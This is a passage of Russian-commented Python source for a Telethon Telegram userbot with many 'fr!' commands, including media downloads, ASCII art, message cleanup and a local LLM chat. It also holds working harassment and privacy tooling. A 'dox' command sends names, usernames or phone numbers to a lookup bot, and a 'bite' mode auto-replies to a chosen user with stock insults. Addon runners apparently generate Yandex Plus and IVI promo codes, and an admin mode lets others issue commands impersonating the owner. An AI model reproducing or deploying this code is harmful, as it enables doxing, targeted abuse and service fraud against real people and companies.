        def generate_variants(text, symbol):
            variants = []
            for i in range(len(text) + 1):
                variants.append(text[:i] + symbol + text[i:])
            random.shuffle(variants)
            return variants

        names = generate_variants(original_name, emoji)
        bios = generate_variants(original_bio, emoji)

        await event.reply(f"🎬 Анимация с эмодзи `{emoji}` запущена. Скорость: {speed:.2f} сек.")

        for _ in range(300):
            if stop_requested:
                break
            new_name = random.choice(names)[:64]
            new_bio = random.choice(bios)[:70]
            await client(UpdateProfileRequest(first_name=new_name, about=new_bio))
            await asyncio.sleep(speed)

        await client(UpdateProfileRequest(first_name=original_name, about=original_bio))
        await event.reply("✅ Анимация завершена.")
    except Exception as e:
        await event.reply(f"❌ Ошибка: {e}")
    finally:
        animating = False
        stop_requested = False

admin_enabled = False  # Управление включено/выключено
admin_mode = 'owner'   # 'owner' - только владелец, 'all' - все, 'list' - только из списка
admin_list = set()     # Множество ID админов, если выбран режим 'list'

async def is_admin(user_id):
    if admin_mode == 'owner':
        return user_id == OWNER_USER_ID
    elif admin_mode == 'all':
        return True
    elif admin_mode == 'list':
        return user_id in admin_list or user_id == OWNER_USER_ID
    return False

@client.on(events.NewMessage(pattern=r'^fr!admin(?:\s+(.+))?$'))
async def admin_control(event):
    global admin_enabled, admin_mode, admin_list

    sender_id = event.sender_id
    if sender_id != OWNER_USER_ID:
        await event.reply("🚫 Команду `fr!admin` может выполнять только владелец.")
        return

    text = event.pattern_match.group(1)
    if not text:
        await event.reply(
            f"Текущий статус:\n"
            f"Управление: {'Включено' if admin_enabled else 'Отключено'}\n"
            f"Режим админов: {admin_mode}\n"
            f"Список админов: {', '.join(map(str, admin_list)) if admin_list else '(пусто)'}\n\n"
            f"Использование:\n"
            f"fr!admin on/off — включить/выключить управление\n"
            f"fr!admin mode [owner|all|list] — установить режим\n"
            f"fr!admin add <id> — добавить в список (режим list)\n"
            f"fr!admin remove <id> — удалить из списка (режим list)"
        )
        return

    args = text.split()
    cmd = args[0].lower()

    if cmd == 'on':
        admin_enabled = True
        await event.reply("✅ Делегированное управление включено.")
    elif cmd == 'off':
        admin_enabled = False
        await event.reply("❌ Делегированное управление отключено.")
    elif cmd == 'mode':
        if len(args) < 2 or args[1] not in ('owner', 'all', 'list'):
            await event.reply("❌ Укажите режим: owner, all или list")
            return
        admin_mode = args[1]
        await event.reply(f"✅ Режим админов установлен на `{admin_mode}`.")
    elif cmd == 'add':
        if admin_mode != 'list':
            await event.reply("❌ Добавлять можно только в режиме `list`. Установите режим через `fr!admin mode list`.")
            return
        if len(args) < 2 or not args[1].isdigit():
            await event.reply("❌ Укажите корректный ID для добавления.")
            return
        uid = int(args[1])
        admin_list.add(uid)
        await event.reply(f"✅ Пользователь с ID `{uid}` добавлен в список админов.")
    elif cmd == 'remove':
        if admin_mode != 'list':
            await event.reply("❌ Удалять можно только в режиме `list`. Установите режим через `fr!admin mode list`.")
            return
        if len(args) < 2 or not args[1].isdigit():
            await event.reply("❌ Укажите корректный ID для удаления.")
            return
        uid = int(args[1])
        admin_list.discard(uid)
        await event.reply(f"✅ Пользователь с ID `{uid}` удалён из списка админов.")
    else:
        await event.reply("❌ Неизвестная команда.")

@client.on(events.NewMessage(pattern=r'^fr!admin (\d+)\s+(.+)$'))
async def delegated_admin_command(event):
    global admin_enabled
    sender_id = event.sender_id

    if not await is_admin(sender_id):
        await event.reply("🚫 У вас нет прав администратора.")
        return

    if not admin_enabled:
        await event.reply("❌ Управление отключено владельцем. Введите `fr!admin on` от владельца.")
        return

    target_id = int(event.pattern_match.group(1))
    command_text = event.pattern_match.group(2).strip()

    if target_id != OWNER_USER_ID:
        await event.reply(f"⚠️ Указан неверный ID владельца. Доступ только к ID `{OWNER_USER_ID}`.")
        return

    # Эмулируем событие от OWNER_USER_ID
    fake_event = event
    fake_event.sender_id = OWNER_USER_ID
    fake_event.raw_text = command_text
    fake_event.message.text = command_text
    fake_event.pattern_match = re.match(r'^fr!(.+)$', command_text)

    # Проброс команды на дальнейшую обработку
    await client.dispatcher._handle_event(fake_event)


logging.basicConfig(
    filename='promoplus.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'

@client.on(events.NewMessage(pattern=r'^fr!promoplus$'))
@owner_only
@vip_only
async def run_yandex_plus_script(event):
    try:
        await event.respond("🚀 Запускаю генерацию промокода Яндекс Плюс...")

        script_path = os.path.join(os.getcwd(), 'addons', 'plus.py')
        if not os.path.exists(script_path):
            await event.respond("❌ Файл plus.py не найден в папке addons.")
            logging.error("Файл plus.py не найден.")
            return

        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'plus.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')
        )

        # Читаем STDOUT построчно
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            try:
                text = line.decode().strip()
            except Exception:
                text = line.decode(errors='ignore').strip()

            if text:
                await event.respond(f"<code>{text}</code>", parse_mode='html')
                logging.info(f"[STDOUT] {text}")

        # Читаем STDERR (если скрипт что-то вывел в ошибку)
        stderr_output = await process.stderr.read()
        if stderr_output:
            err_text = stderr_output.decode(errors='ignore').strip()
            if err_text:
                await event.respond(f"⚠️ Ошибка во время выполнения:\n<code>{err_text}</code>", parse_mode='html')
                logging.warning(f"[STDERR] {err_text}")

        await process.wait()

        await event.respond("✅ Генерация промокода завершена.")
        logging.info("Скрипт plus.py завершил выполнение.")

    except Exception as e:
        msg = f"❌ Ошибка запуска скрипта: {e}"
        await event.respond(msg)
        logging.exception("Ошибка выполнения команды fr!promoplus")
        
@client.on(events.NewMessage(pattern='^fr!gif '))
@owner_only
async def gif_command(event):
    """Обрабатывает команду !gif."""
    query = event.message.text[6:].strip()  # Убираем "fr!gif " и лишние пробелы
    
    if not query:
        await event.respond("❌ Укажите поисковый запрос: fr!gif <запрос>")
        return
    
    gif_url = await get_gif_url(query)

    if gif_url:
        try:
            await client.send_file(event.chat_id, gif_url, caption=f"GIF по запросу: {query}")
        except Exception as e:
            logging.exception(f"Ошибка при отправке GIF: {e}")
            await event.respond("❌ Не удалось отправить GIF")
    else:
        await event.respond(f"🔍 Не удалось найти GIF для: {query}")

@client.on(events.NewMessage(pattern=r'^fr!dox(?: (.*))?'))
@owner_only
async def dox_command(event):
    """
    Поиск информации и пересылка исходного сообщения.
    Формат: fr!dox <любая информация> 
    """
    args = event.pattern_match.group(1)
    
    if not args:
        await event.respond("❌ Укажите информацию для поиска: fr!dox <ник/имя/номер>")
        return
    
    try:
        # Заменяем @username на t.me/username
        if args.startswith('@'):
            args = f"t.me/{args[1:]}"
        
        # Отправляем запрос в бота
        await send_to_bot(client, event, BOT_USERNAME, args)
        
        # Пересылаем исходное сообщение (если команда вызвана ответом)
        if event.is_reply:
            replied_msg = await event.get_reply_message()
            await client.forward_messages(BOT_USERNAME, replied_msg)
            
    except Exception as e:
        await event.respond(f"❌ Ошибка: {str(e)}")

import json
import urllib.request
import logging
from telethon import events

# Настройка логирования в консоль
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

if ENABLE_FR_AI:
    from transformers import pipeline
    from llama_cpp import Llama
    import os

    logging.disable(logging.CRITICAL)  # Можно вообще убрать, если не используешь logging

    model_dir = "models"
    model_path = os.path.join(".", model_dir, ai_model)
    llm = Llama(model_path=os.path.join("models", ai_model), n_ctx=131072, n_threads=6, verbose=False)

    @client.on(events.NewMessage(pattern=r'^fr!AI(?: (.*))?'))
    @owner_only
    async def handle_fr_ai(event):
        user_input = event.pattern_match.group(1)

        if not user_input:
            await event.respond("⚠️ Используй: `fr!AI <текст>`")
            return

        await event.respond("⏳ Генерирую ответ...")

        try:
            prompt = (
                "Ты умный, разговорный помощник. Отвечай на русском языке, понятно и по существу.\n"
                f"Пользователь: {user_input}\n"
                "Ответ:"
            )
            result = llm(
                prompt,
                max_tokens=512,
                temperature=0.7,
                top_p=0.9,
                stop=["\nПользователь:", "\nОтвет:"]
            )
            reply = result["choices"][0]["text"].strip()

            if not reply:
                reply = "❌ Модель не смогла сгенерировать осмысленный ответ."

            await event.respond(f"🤖 Ответ:\n\n{reply}")

        except Exception:
            await event.respond("❌ Произошла ошибка при генерации текста.")

else:
    print(f"{WARNING_COLOR}Команда fr!AI отключена, модель не загружается и обработчик не регистрируется.{RESET_COLOR}")




from pyfiglet import figlet_format

def image_to_ascii(img, width=80):
    img = img.convert("L")  # grayscale
    aspect_ratio = img.height / img.width
    new_height = int(aspect_ratio * width * 0.5)
    img = img.resize((width, new_height))
    pixels = np.array(img)

    ascii_str = ""
    for row in pixels:
        for pixel in row:
            p = int(pixel)  # явное преобразование uint8 -> int
            index = min(p * len(ASCII_CHARS) // 256, len(ASCII_CHARS) - 1)
            ascii_str += ASCII_CHARS[index]
        ascii_str += "\n"
    return ascii_str

def render_text_to_image(text, font_size=40):
    font = ImageFont.load_default()  # ДЕФОЛТНЫЙ ШРИФТ

    # Оценка размеров изображения через textbbox
    dummy_img = Image.new("L", (1, 1))
    draw = ImageDraw.Draw(dummy_img)
    bbox = draw.textbbox((0, 0), text, font=font)
    text_width = bbox[2] - bbox[0]
    text_height = bbox[3] - bbox[1]

    img = Image.new("L", (text_width + 10, text_height + 10), color=255)
    draw = ImageDraw.Draw(img)
    draw.text((5, 5), text, font=font, fill=0)
    return img

@client.on(events.NewMessage(pattern=r'^fr!ascii (.+)'))
@owner_only
async def ascii_art_handler(event):
    text = event.pattern_match.group(1)
    
    if re.search('[а-яА-Я]', text):
        await event.respond("Ошибка: русский текст не поддерживается, используйте только латиницу и цифры.")
        return
    
    ascii_text = Figlet().renderText(text)
    response = f"```\n {ascii_text[:1999]}{'...' if len(ascii_text) > 1999 else ''}\n```"
    await event.respond(response, parse_mode='markdown')

@client.on(events.NewMessage(pattern=r'^fr!readall$'))
@owner_only
async def read_all_handler(event):
    dialogs = await client.get_dialogs()
    for dialog in dialogs:
        if dialog.unread_count > 0:
            await client.send_read_acknowledge(dialog.entity)
    await event.respond("✅ Все сообщения помечены как прочитанные")

@client.on(events.NewMessage(pattern=r'^fr!ping$'))
async def ping_handler(event):
    start = time.time()
    message = await event.respond('🏓 Pong!')
    end = time.time()
    latency = round((end - start) * 1000, 2)
    await message.edit(f'🏓 Pong! | {latency}ms')

@client.on(events.NewMessage(pattern=r'^fr!id$'))
async def id_handler(event):
    await event.respond(f"👤 Ваш ID: `{event.sender_id}`\n💬 ID чата: `{event.chat_id}`",
                        parse_mode='markdown')

@client.on(events.NewMessage(pattern=r'^fr!admin (on|off)$'))
@owner_only
async def admin_handler(event):
    global admin_enabled
    cmd = event.pattern_match.group(1).lower()
    if cmd == "on":
        admin_enabled = True
        await event.respond("✅ Управление ботом другими пользователями разрешено.")
    else:
        admin_enabled = False
        await event.respond("❌ Управление ботом другими пользователями запрещено.")
        
@client.on(events.NewMessage(pattern=r'^fr!ascii (.+)'))
@owner_only
async def ascii_art_handler(event):
    text = event.pattern_match.group(1)
    
    if re.search('[а-яА-Я]', text):
        await event.respond("Ошибка: русский текст не поддерживается, используйте только латиницу и цифры.")
        return
    
    ascii_text = Figlet().renderText(text)
    # Добавляем пробел в начале и обрезаем если нужно
    response = f"```\n {ascii_text[:1999]}{'...' if len(ascii_text) > 1999 else ''}\n```"
    await event.respond(response, parse_mode='markdown')
        
@client.on(events.NewMessage)
async def handle_nickname_input(event):
    chat_id = event.chat_id
    if pending_dox_requests.get(chat_id) and event.sender_id == (await get_owner_id()):
        nickname = event.text
        # ПРОВЕРКА НИКНЕЙМА!!!!
        if not re.match(r'^[a-zA-Z0-9_]{5,32}$', nickname):
            await event.respond("Неверный формат имени пользователя.")
            del pending_dox_requests[chat_id]
            return
        info_text = f"t.me/{nickname}"
        try:
            await send_to_bot(client, event, BOT_USERNAME, info_text)
        except Exception as e:
            logging.exception(f"Ошибка при отправке в BOT_USERNAME: {e}")
            await event.respond("Ошибка при отправке!")
        del pending_dox_requests[chat_id]  # Убираем из ожидания
        
# ==== Утилита для извлечения ID видео из ссылки или строки ====
def extract_video_id(url_or_id):
    match = re.search(r"(?:v=|youtu\.be/)([a-zA-Z0-9_-]{11})", url_or_id)
    if match:
        return match.group(1)
    if len(url_or_id) == 11:
        return url_or_id
    return None

# ==== Команда fr!video для Telethon userbot ====
import os
import re
from yt_dlp import YoutubeDL
from telethon import events

pending_downloads = {}  # chat_id -> {'url': url, 'formats': {res: format_code}}

def format_duration(seconds: int) -> str:
    return f"{seconds//60}:{seconds%60:02d}"

def is_url(text: str) -> bool:
    return re.match(r'https?://', text) is not None

@client.on(events.NewMessage(pattern=r'^fr!video (.+)$'))
@owner_only
async def handle_video_request(event):
    chat_id = event.chat_id
    user_input = event.pattern_match.group(1).strip()

    url = user_input if is_url(user_input) else f"ytsearch:{user_input}"

    ydl_opts = {
        'quiet': True,
        'no_warnings': True,
        'skip_download': True,
        'noplaylist': True,
    }

    try:
        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)

        if 'entries' in info:
            info = info['entries'][0]

        formats = {}
        for f in info.get('formats', []):
            if (
                f.get('acodec') != 'none' and
                f.get('vcodec') != 'none' and
                f.get('ext') == 'mp4' and
                f.get('height')
            ):
                res = str(f['height'])
                formats[res] = f['format_id']

        if not formats:
            await event.respond("❌ Не удалось найти подходящие форматы для скачивания.")
            return

        sorted_res = sorted(formats.keys(), key=lambda x: int(x))

        pending_downloads[chat_id] = {
            'url': info['webpage_url'],
            'formats': formats,
        }

        # Отправляем обложку, если есть
        thumbnail = info.get('thumbnail')
        if thumbnail:
            await client.send_file(chat_id, thumbnail)

        caption = (
            f"📹 Название: {info.get('title', 'Без названия')}\n"
            f"👤 Автор: {info.get('uploader', 'Неизвестен')}\n"
            f"⏱ Длительность: {format_duration(info.get('duration', 0))}\n\n"
            f"Доступные качества для скачивания:\n"
            + "\n".join(f"{res}p" for res in sorted_res) + "\n\n"
            "Напишите, например, 'скачать 480p' для скачивания в выбранном качестве."
        )

        await event.respond(caption)

    except Exception as e:
        await event.respond(f"❌ Не удалось получить информацию о видео: {str(e)}")

@client.on(events.NewMessage)
async def handle_download_confirmation(event):
    chat_id = event.chat_id
    text = event.raw_text.strip().lower()

    if chat_id in pending_downloads:
        data = pending_downloads[chat_id]
        url = data['url']
        formats = data['formats']

        m = re.search(r'(\d{3,4})', text)
        if (text.startswith('скачать') and m) or (text.isdigit() and text in formats):
            res = m.group(1) if m else text
            if res not in formats:
                await event.respond(f"❌ Качество {res}p недоступно. Выберите из списка.")
                return

            format_code = formats[res]

            msg = await event.respond(f"⏬ Видео загружается в {res}p, подождите...")

            ydl_opts = {
                'format': format_code,
                'outtmpl': f'yt_%(title)s_{res}p.%(ext)s',
                'merge_output_format': 'mp4',
                'quiet': True,
                'no_warnings': True,
                'noplaylist': True,
            }

            try:
                with YoutubeDL(ydl_opts) as ydl:
                    info = ydl.extract_info(url, download=True)
                    filename = ydl.prepare_filename(info)

                caption = (
                    f"📹 {info.get('title', 'Без названия')}\n"
                    f"👤 Автор: {info.get('uploader', 'Неизвестен')}\n"
                    f"⏱ Длительность: {format_duration(info.get('duration', 0))}\n"
                    f"🔗 Ссылка: {info.get('webpage_url', url)}\n\n"
                )

                await client.send_file(chat_id, filename, caption=caption)
                await msg.delete()

                os.remove(filename)

            except Exception as e:
                await msg.edit(f"❌ Ошибка при скачивании: {str(e)}")

            pending_downloads.pop(chat_id, None)

        elif text in ['скачать', 'да', 'ок', 'download']:
            sorted_res = sorted(formats.keys(), key=lambda x: int(x))
            await event.respond(
                "Пожалуйста, укажите качество для скачивания.\n"
                "Доступные качества:\n" + "\n".join(f"{res}p" for res in sorted_res) + "\n\n"
                "Напишите, например, 'скачать 480' или просто '480'."
            )
        
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s:%(message)s')
        
@client.on(events.NewMessage(pattern=r'^fr!music (yt|sc) (.+)'))
@owner_only
async def music_handler(event):
    source = event.pattern_match.group(1)
    query = event.pattern_match.group(2).strip()
    chat = await event.get_chat()

    msg = await event.respond(f"Ищу музыку на {source}... ⏳")

    os.makedirs('downloads', exist_ok=True)

    ydl_opts = {
        'format': 'bestaudio/best',
        'outtmpl': 'downloads/%(title)s.%(ext)s',
        'quiet': True,
        'no_warnings': True,
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '192',
        }],
        'progress_hooks': [],
    }

    loop = asyncio.get_event_loop()

    async def progress_hook(d):
        status = d.get('status')
        downloaded = d.get('downloaded_bytes', 0)
        total = d.get('total_bytes') or d.get('total_bytes_estimate')
        percent = (downloaded / total * 100) if total else 0

        if status == 'downloading':
            text = f"Скачивание: {percent:.1f}%"
        elif status == 'finished':
            text = f"Скачивание завершено: 100%. Конвертация..."
        else:
            text = f"Статус: {status}"

        try:
            await msg.edit(text)
        except Exception:
            pass

    def hook(d):
        asyncio.run_coroutine_threadsafe(progress_hook(d), loop)

    ydl_opts['progress_hooks'].append(hook)

    try:
        if source == 'yt':
            url = f"ytsearch1:{query}"
        elif source == 'sc':
            url = f"scsearch1:{query}"
        else:
            await msg.edit("Источник не распознан.")
            return

        with YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            if 'entries' in info:
                info = info['entries'][0]

            filename_base = ydl.prepare_filename(info)
            filename = os.path.splitext(filename_base)[0] + ".mp3"

        await msg.edit(f"Отправляю: {info.get('title', 'Трек')} 🎵")
        await client.send_file(chat, filename)
        os.remove(filename)

    except Exception as e:
        await msg.edit("Ошибка при скачивании или конвертации музыки.")
        logging.exception("Ошибка music_handler:")




@client.on(events.NewMessage(pattern=r'fr!tg (\S+)(?: (id))?'))
@owner_only
async def stat_command(event):
    args = event.pattern_match.group(1)  # Ник или ID
    is_id = event.pattern_match.group(2)  # 'id' если указан

    if not args:
        await event.respond("❌ Укажите username или ID: fr!tg <ник> или fr!tg <ID> id")
        return

    query = args if is_id else args.lstrip('@')

    # Проверка существования юзернейма, если это не ID
    if not is_id:
        try:
            await client(ResolveUsernameRequest(query))
        except (UsernameNotOccupiedError, UsernameInvalidError):
            await event.respond("❌ Ошибка: Пользователь не найден или username некорректен.")
            return
        except Exception as e:
            await event.respond(f"⚠️ Ошибка при проверке username: {e}")
            return

    try:
        # Отправка запроса статистическому боту
        async with client.conversation(STAT_BOT_USERNAME) as conv:
            await conv.send_message(query if is_id else f"@{query}")

            while True:
                try:
                    response = await conv.get_response(timeout=30)
                    if not ("⏳" in response.text or "📊 Статистика" in response.text):
                        # Убираем кликабельные ссылки
                        text = re.sub(r'https://', 'https ://', response.text)
                        text = re.sub(r't\.me/', 't. me/', text)
                        await event.respond(
                            f"📊 Статистика для {'ID' if is_id else 'юзернейма'}: {query}\n\n{text}"
                        )
                        break
                except asyncio.TimeoutError:
                    await event.respond("⌛ Бот статистики не ответил в течение 30 секунд.")
                    break

    except Exception as e:
        await event.respond(f"❌ Ошибка: {str(e)}")

EDIT_COMMANDS = ['fr!edit', 'fr!e', 'fr!е', 'fr!ред']
DEL_COMMANDS = ['fr!del', 'fr!d', 'fr!д', 'fr!дел']

# 📝 Команда редактирования
@client.on(events.NewMessage(outgoing=True, pattern=r'^(fr!(?:edit|e|е|ред)) (\d{1,2}) (.+)'))
async def handler_edit(event):
    try:
        count = int(event.pattern_match.group(2))
        new_text = event.pattern_match.group(3)

        async for msg in client.iter_messages(event.chat_id, from_user='me', limit=count + 1):
            if msg.id != event.id:
                await msg.edit(new_text)
        await event.delete()
    except Exception as e:
        await event.reply(f"Ошибка при редактировании: {e}")

# Хранение активных автосмс и байта
auto_sms_targets = {}  # {chat_id: {user_id: text}}
bite_targets = {}      # {chat_id: set(user_id)}

insults = [
    "Ты вообще понимаешь что пишешь или просто дебил",
    "Слушай твой интеллект явно на уровне тапка",
    "С каждым твоим сообщением в чат опускается планка качества",
    "Ты словно ходячий баг в этой беседе надоел всем",
    "Если бы глупость была преступлением ты был бы пожизненно",
    "Твои мысли настолько убоги что хочется выключить тебя навсегда",
    "Ты настолько жалок что даже коты тебя игнорируют",
    "Лучше бы ты молчал это было бы полезнее для всех",
    "Твой уровень общения это оскорбление здравого смысла",
    "У тебя мозг из кефира который уже давно прокис",
    "Пожалуйста перестань постить ты убиваешь мое желание общаться",
    "В следующий раз когда захочешь что то сказать сначала подумай нет не надо",
    "Ты причина почему у некоторых людей пропадает вера в человечество",
    "Твои сообщения вызывают только стыд за человечество",
    "Выйди из чата пока не стало хуже",
    "Тебя нельзя воспринимать всерьёз ты просто помеха",
    "Ты живое доказательство того что интеллект не гарантирован генами",
    "От твоих слов хочется вырвать глаза и уши",
    "Ты мог бы заткнуться и сделать мир лучше поверь",
    "Каждое твое сообщение маленькая катастрофа для меня"
]

def is_command(text, *cmds):
    text = text.lower()
    return any(text.startswith(c) for c in cmds)

@client.on(events.NewMessage(outgoing=True))
async def commands_handler(event):
    text = event.text
    chat_id = event.chat_id

    # fr!автосмс [текст], в ответ на сообщение пользователя
    if is_command(text, "fr!автосмс", "fr!autosms", "fr!автосмс+", "fr!autosms+"):
        # Команда должна быть ответом на сообщение пользователя, иначе нельзя понять кого
        if not event.is_reply:
            await event.reply("❗️ Ответьте на сообщение пользователя, которому включить автосмс")
            return

        # Извлекаем текст команды (после "fr!автосмс")
        parts = text.split(' ', 1)
        if len(parts) < 2 or not parts[1].strip():
            await event.reply("❗️ Укажите текст для автосмс, например:\nfr!автосмс Привет")
            return
        reply_text = parts[1].strip()

        replied = await event.get_reply_message()
        user = await replied.get_sender()
        if not user:
            await event.reply("❗️ Не могу получить информацию о пользователе")
            return

        if chat_id not in auto_sms_targets:
            auto_sms_targets[chat_id] = {}
        auto_sms_targets[chat_id][user.id] = reply_text
        await event.reply(f"✅ Автосмс включён для [{user.first_name}](tg://user?id={user.id})")

    # fr!автосмсстоп, в ответ на сообщение пользователя или без - отключить
    elif is_command(text, "fr!автосмсстоп", "fr!автосмс-", "fr!autosms-"):
        if event.is_reply:
            replied = await event.get_reply_message()
            user = await replied.get_sender()
            if chat_id in auto_sms_targets and user.id in auto_sms_targets[chat_id]:
                del auto_sms_targets[chat_id][user.id]
                await event.reply(f"✅ Автосмс отключён для [{user.first_name}](tg://user?id={user.id})")
            else:
                await event.reply("❗️ Для этого пользователя автосмс не включён")
        else:
            # Без reply - отключаем все автосмс в чате
            if chat_id in auto_sms_targets:
                auto_sms_targets.pop(chat_id)
                await event.reply("✅ Автосмс отключён для всех пользователей в этом чате")
            else:
                await event.reply("❗️ В этом чате нет включённых автосмс")

    # fr!байт - в ответ на сообщение пользователя
    elif is_command(text, "fr!байт", "fr!bite"):
        if not event.is_reply:
            await event.reply("❗️ Ответьте на сообщение пользователя, чтобы включить байт")
            return

        replied = await event.get_reply_message()
        user = await replied.get_sender()
        if not user:
            await event.reply("❗️ Не могу получить информацию о пользователе")
            return

        if chat_id not in bite_targets:
            bite_targets[chat_id] = set()
        bite_targets[chat_id].add(user.id)
        await event.reply(f"🔥 Байт включён для [{user.first_name}](tg://user?id={user.id})")

    # fr!байтстоп - в ответ на сообщение пользователя или без
    elif is_command(text, "fr!байтстоп", "fr!bite-", "fr!байт-"):
        if event.is_reply:
            replied = await event.get_reply_message()
            user = await replied.get_sender()
            if chat_id in bite_targets and user.id in bite_targets[chat_id]:
                bite_targets[chat_id].remove(user.id)
                await event.reply(f"🛑 Байт отключён для [{user.first_name}](tg://user?id={user.id})")
            else:
                await event.reply("❗️ Для этого пользователя байт не включён")
        else:
            if chat_id in bite_targets:
                bite_targets.pop(chat_id)
                await event.reply("🛑 Байт отключён для всех пользователей в этом чате")
            else:
                await event.reply("❗️ В этом чате нет включённого байта")

@client.on(events.NewMessage())
async def message_handler(event):
    if event.out:
        # Не реагируем на свои сообщения
        return
    chat_id = event.chat_id
    sender = await event.get_sender()
    if sender is None or sender.is_self:
        return
    user_id = sender.id

    # Автосмс
    if chat_id in auto_sms_targets and user_id in auto_sms_targets[chat_id]:
        await event.reply(auto_sms_targets[chat_id][user_id])

    # Байт
    if chat_id in bite_targets and user_id in bite_targets[chat_id]:
        insult = random.choice(insults)
        await event.reply(insult)
        
from datetime import datetime, timedelta

# 🧹 Команда удаления
@client.on(events.NewMessage(outgoing=True, pattern=r'^(fr!(?:del|d|д|дел)) (\d+)'))
async def handler_delete(event):
    try:
        count = int(event.pattern_match.group(2))
        deleted = 0
        cutoff = datetime.now(timezone.utc) - timedelta(days=7)  # например, удаляем сообщения не старше 7 дней
        messages_to_delete = []

        async for msg in client.iter_messages(event.chat_id, from_user='me', limit=count * 2):
            # Фильтр по дате (можешь убрать или поменять)
            if msg.date < cutoff:
                continue
            messages_to_delete.append(msg)
            if len(messages_to_delete) >= count:
                break

        if not messages_to_delete:
            await event.respond("Не найдено подходящих сообщений для удаления.")
            return

        # Удаляем по одному с небольшой задержкой (можно убрать задержку если хочешь)
        for msg in messages_to_delete:
            try:
                await client.delete_messages(event.chat_id, msg)
                deleted += 1
                await asyncio.sleep(0.1)  # пауза, чтобы не перегрузить API
            except Exception as e:
                await event.reply(f"Не удалось удалить сообщение {msg.id}: {e}")

        await event.respond(f"Удалено {deleted} сообщений.")
    except Exception as e:
        await event.reply(f"Ошибка при удалении: {e}")
        
from telethon.tl.functions.users import GetFullUserRequest

async def get_name(client, user_id):
    try:
        entity = await client.get_entity(int(user_id))
        if hasattr(entity, 'first_name') and entity.first_name:
            # Собираем имя и фамилию (если есть)
            first = entity.first_name or ""
            last = getattr(entity, 'last_name', "") or ""
            full_name = (first + " " + last).strip()
            return full_name if full_name else str(user_id)
        elif hasattr(entity, 'title'):
            # Для каналов/чатов
            return entity.title
        else:
            return str(user_id)
    except Exception:
        return str(user_id)


@client.on(events.NewMessage(pattern=r'^fr!vipcheck(?: (\d+))?$'))
async def vipcheck(event):
    arg = event.pattern_match.group(1)
    sender_uid = str(event.sender_id)
    url = "https://raw.githubusercontent.com/DdejjCAT/LITEHACKDATABASE/main/database.enc"

    if arg and sender_uid == str(OWNER_USER_ID):
        uid_to_check = arg
    else:
        uid_to_check = sender_uid

    async def get_name(user_id):
        try:
            entity = await client.get_entity(int(user_id))
            if hasattr(entity, 'first_name'):
                first = entity.first_name or ""
                last = getattr(entity, 'last_name', "") or ""
                return (first + " " + last).strip() or str(user_id)
            elif hasattr(entity, 'title'):
                return entity.title
            else:
                return str(user_id)
        except:
            return str(user_id)

    try:
        sender_name = await get_name(sender_uid)
        host_name = await get_name(OWNER_USER_ID)
        check_name = await get_name(uid_to_check)

        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    await event.respond("⚠️ Не удалось загрузить данные лицензий.")
                    return

                encrypted_bytes = await resp.read()
                decrypted_text = decrypt_json(encrypted_bytes, key, iv)
                data = decrypted_text

                def user_status(uid):
                    is_admin = uid in data.get("admins", {}) and data["admins"][uid]
                    is_vip = uid in data.get("vip", {})
                    if is_admin and is_vip:
                        return "💼 Админ + 💎 VIP"
                    elif is_admin:
                        return "💼 Админ"
                    elif is_vip:
                        return f"💎 VIP до `{data['vip'][uid]}`"
                    else:
                        return "🚫 Нет доступа (VIP/ADMIN)"

                msg = (
                    f"👤 Запрос от: `{sender_name}` (`{sender_uid}`)\n\n"
                    f"🏠 Хост: `{host_name}` (`{OWNER_USER_ID}`) — {user_status(str(OWNER_USER_ID))}\n\n"
                    f"🔍 Проверяемый: `{check_name}` (`{uid_to_check}`) — {user_status(str(uid_to_check))}"
                )
                await event.respond(msg, parse_mode='markdown')

    except Exception as e:
        await event.respond(f"❌ Ошибка при проверке VIP/ADMIN: `{e}`", parse_mode='markdown')


# Настройка логирования
logging.basicConfig(
    filename='promoivi.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    encoding='utf-8'
)

PYTHON_EXECUTABLE = 'python3' if platform.system() != "Windows" else 'python'

@client.on(events.NewMessage(pattern=r'^fr!promoivi$'))
@owner_only
@vip_only
async def run_promo_script(event):
    try:
        await event.respond("🚀 Запускаю генерацию промокода IVI...")

        script_path = os.path.join(os.getcwd(), 'addons', 'ivi.py')
        if not os.path.exists(script_path):
            await event.respond("❌ Файл ivi.py не найден в папке addons.")
            logging.error("Файл ivi.py не найден.")
            return

        process = await asyncio.create_subprocess_exec(
            PYTHON_EXECUTABLE, 'ivi.py',
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=os.path.join(os.getcwd(), 'addons')
        )

        # Чтение STDOUT
        while True:
            line = await process.stdout.readline()
            if not line:
                break
            try:
                text = line.decode().strip()
            except Exception:
                text = line.decode(errors='ignore').strip()

            if text:
                await event.respond(f"<code>{text}</code>", parse_mode='html')
                logging.info(f"[STDOUT] {text}")

        # Чтение STDERR
        stderr_output = await process.stderr.read()
        if stderr_output:
            err_text = stderr_output.decode(errors='ignore').strip()
            if err_text:
                await event.respond(f"⚠️ Ошибка во время выполнения:\n<code>{err_text}</code>", parse_mode='html')
                logging.warning(f"[STDERR] {err_text}")

        await process.wait()

        await event.respond("✅ Генерация промокода IVI завершена.")
        logging.info("Скрипт ivi.py завершил выполнение.")

    except Exception as e:
        msg = f"❌ Ошибка запуска скрипта: {e}"
        await event.respond(msg)
        logging.exception("Ошибка выполнения команды fr!promoivi")
       
@client.on(events.NewMessage(pattern=r'fr!license'))
async def license(event):
    license_message = (
        f"✅ Лицензия верифицирована FENST4R на сервере.\n"
        f"Для перепроверки напишите @error_kill.\n"
        f"ID юзера-хоста для проверки: `{OWNER_USER_ID}`"
    )
    await event.respond(license_message)

import os
from telethon import events

